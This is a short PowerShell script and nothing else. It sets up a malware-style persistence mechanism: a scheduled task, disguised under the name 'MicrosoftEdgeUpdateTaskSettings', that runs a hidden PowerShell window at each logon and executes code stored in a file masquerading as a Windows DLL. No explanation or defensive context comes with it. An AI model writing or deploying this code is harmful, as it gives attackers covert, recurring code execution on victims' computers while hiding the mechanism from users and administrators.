$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-WindowStyle hidden -command `"iex (Get-Content -path 'C:\Windows\winprop.dll' -Raw)`""
$trigger = New-ScheduledTaskTrigger -AtLogon
$settings = New-ScheduledTaskSettingsSet
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
Register-ScheduledTask MicrosoftEdgeUpdateTaskSettings -InputObject $task
